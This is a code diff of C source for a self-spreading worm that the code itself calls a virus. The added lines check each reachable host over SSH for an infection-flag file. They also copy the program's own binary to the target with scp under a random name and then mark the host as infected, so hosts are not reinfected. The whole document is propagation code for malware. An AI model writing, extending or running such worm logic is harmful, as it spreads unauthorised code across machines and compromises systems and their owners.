@@ -51,6 +51,16 @@ bool is_authorized(char *ip) {
     }
 }
 
+bool is_infected(char *ip) {
+    char cmd_buffer[256];
+    snprintf(cmd_buffer, sizeof(cmd_buffer), "ssh debian@%s stat %s/%s", ip, VIRUS_WOKRING_DIR, INFECTED_FLAG);
+    if(system(cmd_buffer) == 0) {
+        return true;
+    } else {
+        return false;
+    }
+}
+
 bool is_master_node(char *ip) {
     char hostbuffer[256];
     struct hostent *host_entry;
@@ -82,6 +92,9 @@ void execute_payload(char *virus_name, char *target_ip_buff) {
     // copy virus in tmpfs
     generate_random_string(rnd_name_buffer);
     snprintf(cmd_buffer, sizeof(cmd_buffer), "scp %s debian@%s:%s/%s", virus_name, target_ip_buff, VIRUS_WOKRING_DIR, rnd_name_buffer);
+    system(cmd_buffer);
+
+    snprintf(cmd_buffer, sizeof(cmd_buffer), "ssh debian@%s touch %s/%s", target_ip_buff, VIRUS_WOKRING_DIR, INFECTED_FLAG);
     system(cmd_buffer);
 }
 
@@ -140,8 +153,8 @@ int main(int argc, char **argv) {
 
             // try socket connection
             if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
-                // 
-                if(!is_master_node(master_ip) && is_authorized(target_ip_buff)) {
+                // execute payload
+                if(!is_master_node(master_ip) && is_authorized(target_ip_buff) && !is_infected(target_ip_buff)) {
                     execute_payload(argv[0], target_ip_buff);
                 }
             }
